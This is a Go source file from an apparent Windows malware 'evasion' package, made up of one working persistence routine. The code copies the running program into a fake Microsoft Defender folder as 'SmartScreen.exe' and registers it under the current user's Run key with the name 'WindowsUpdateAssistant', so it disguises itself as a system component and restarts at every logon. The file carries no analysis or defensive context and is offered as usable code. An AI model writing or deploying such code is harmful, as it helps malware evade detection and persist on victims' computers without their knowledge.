//go:build windows
package evasion

import (
	"fmt"
	"io"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// InstallPersistence copies the binary to a hidden location and adds a registry run key.
func InstallPersistence() error {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return fmt.Errorf("APPDATA environment variable not found")
	}

	targetDir := filepath.Join(appData, "Microsoft", "Windows", "Defender")
	targetPath := filepath.Join(targetDir, "SmartScreen.exe")

	// Ensure target directory exists
	err := os.MkdirAll(targetDir, 0755)
	if err != nil {
		return err
	}

	// Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	// If already running from the target path, just ensure registry is set
	if exePath == targetPath {
		return setRegistryKey(targetPath)
	}

	// Copy the file
	err = copyFile(exePath, targetPath)
	if err != nil {
		return err
	}

	return setRegistryKey(targetPath)
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func setRegistryKey(path string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	err = key.SetStringValue("WindowsUpdateAssistant", path)
	return err
}
